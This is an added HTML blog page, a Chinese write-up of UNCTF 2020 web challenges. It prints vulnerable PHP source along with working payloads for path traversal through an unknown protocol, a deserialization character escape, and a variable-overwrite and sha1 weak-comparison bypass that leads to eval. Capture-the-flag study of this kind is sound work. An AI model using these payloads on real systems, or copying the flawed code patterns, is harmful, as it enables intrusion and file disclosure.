@@ -1,0 +1,913 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>UNCTF - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-17 23:13" pubdate>
+        2020年11月17日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      33
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">UNCTF</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
+<span id="more"></span>
+
+<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/unctf\.com/&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
+    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;
+        <span class="hljs-variable">$url</span>=file_get_contents(<span class="hljs-variable">$url</span>);
+        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$url</span>);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;error&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通</p>
+<p>后来才知道考点根本不绕过。</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs awk">?file=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag
+<span class="hljs-regexp">//</span>不唯一
+?file=():unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag
+<span class="hljs-regexp">//</span>()里可以填任意字符除了正则过滤的几个协议</code></pre></div>
+
+<p><strong>原理：</strong>当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。</p>
+<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
+<p>先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
+&#125;
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
+<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
+
+<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>利用反序列化逃逸修改pass的值。</p>
+<p>正常的序列化结果</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre></div>
+
+<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
+<p>例如</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre></div>
+
+<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
+<p><img src="/2020/11/17/UNCTF/C:%5CUsers%5CSunzh%5CDesktop%5CCtefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
+<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
+<p>例如想将pass变量的序列化字符串如下</p>
+<div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre></div>
+
+<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
+<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
+&#125;
+<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
+var_dump(serialize(<span class="hljs-variable">$AA</span>));
+<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
+var_dump(<span class="hljs-variable">$res</span>);
+<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
+<span class="hljs-comment">//echo unserialize($AA);</span>
+<span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span>
+<span class="hljs-meta">?&gt;</span>
+   <span class="hljs-comment">//结果如下   ||为对齐</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||</span>
+<span class="hljs-comment">string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span>
+<span class="hljs-comment">hacker</span>
+<span class="hljs-comment">*/</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p>
+<p>这里pass的值就被该称了hacker</p>
+<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sumarua/p/12932401.html">参考</a></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
+        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
+            &#123;
+                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
+                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    
+            &#125;
+            <span class="hljs-keyword">else</span>
+            &#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong password&#x27;</span>;
+            &#125;
+        &#125;
+    &#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+&#125;
+
+<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];
+<span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;
+<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-variable">$test</span>=unserialize(<span class="hljs-variable">$ser</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>这段代码的意思大致为，get方式提交一个1作为uname，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
+<p>需要构造的属性</p>
+<div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;&#125;</code></pre></div>
+
+<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
+<div class="hljs"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre></div>
+
+<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;1&quot;</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
+&#125;
+<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
+<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;
+
+<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>
+
+<p>finalpayload：</p>
+<div class="hljs"><pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre></div>
+
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  /source查看源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$adminPassword</span> = <span class="hljs-string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;
+<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;fuxkSQL&#x27;</span>)) &#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span>(<span class="hljs-params"><span class="hljs-variable">$iText</span></span>)    </span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$oText</span> = <span class="hljs-variable">$iText</span>;
+        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-variable">$oText</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>, <span class="hljs-variable">$oText</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$oText</span>;
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;getVars&#x27;</span>)) &#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$totals</span> = array_merge(<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>);
+        <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$_GET</span>)) &#123;
+            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
+                <span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$key</span>&#125;;
+                <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$value</span>)) &#123;
+                    <span class="hljs-variable">$temp_array</span> = <span class="hljs-keyword">array</span>();
+                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key2</span> =&gt; <span class="hljs-variable">$value2</span>) &#123;
+                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
+                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = fuxkSQL(trim(<span class="hljs-variable">$value2</span>));
+                        &#125; <span class="hljs-keyword">else</span> &#123;
+                            <span class="hljs-variable">$temp_array</span>[<span class="hljs-variable">$key2</span>] = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (trim(<span class="hljs-variable">$value2</span>))));
+                        &#125;
+                    &#125;
+                    $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$temp_array</span>;
+                &#125; <span class="hljs-keyword">else</span> &#123;
+                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;
+                        $&#123;<span class="hljs-variable">$key</span>&#125; = fuxkSQL(trim(<span class="hljs-variable">$value</span>));
+                    &#125; <span class="hljs-keyword">else</span> &#123;
+                        $&#123;<span class="hljs-variable">$key</span>&#125; = <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, (trim(<span class="hljs-variable">$value</span>))));
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+getVars();
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$source</span>)) &#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+<span class="hljs-comment">//只有admin才能设置环境变量</span>
+<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$password</span>) === <span class="hljs-variable">$adminPassword</span> &amp;&amp; sha1(<span class="hljs-variable">$verif</span>) == <span class="hljs-variable">$verif</span>) &#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can set config variables!!&#x27;</span> . <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;
+    <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; strlen(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
+            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$<span class="hljs-subst">$key</span>&quot;</span> . <span class="hljs-string">&#x27;=&quot;&#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);
+        &#125;
+    &#125;
+&#125; <span class="hljs-keyword">else</span> &#123;
+    <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>)) &#123;
+            <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) . <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+<p>代码很长，但是很容易理解 </p>
+<p>fuxkSQL是将可能存在sql注入的符号转义</p>
+<p>getvarh是将传的参数赋值</p>
+<p>global ${$key};这里存在两个$$，所以可能存在变量覆盖</p>
+<p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p>
+<p>$password的md5值与adminPassword,这里可以利用变量覆盖绕过</p>
+<p>password=111&amp;adminPassword=md(111)</p>
+<p>sha1($verif)==$verif弱类型比较，也很容易绕过</p>
+<p>sha1($a)=0exxx</p>
+<p>只要找出0e开头的字符串的sha1值为0e开头</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i5</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i5</span> &lt;= <span class="hljs-number">9999999999</span>; <span class="hljs-variable">$i5</span>++) &#123;
+    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;0e&#x27;</span> . <span class="hljs-variable">$i5</span>;
+    <span class="hljs-comment">//0e1290633704</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == hash(<span class="hljs-string">&#x27;sha1&#x27;</span>, <span class="hljs-variable">$res</span>)) &#123;
+        print_r(<span class="hljs-variable">$res</span>);
+    &#125;
+&#125;
+</code></pre></div>
+
+<p>所以verif=0e1290633704</p>
+<p>重点在这</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
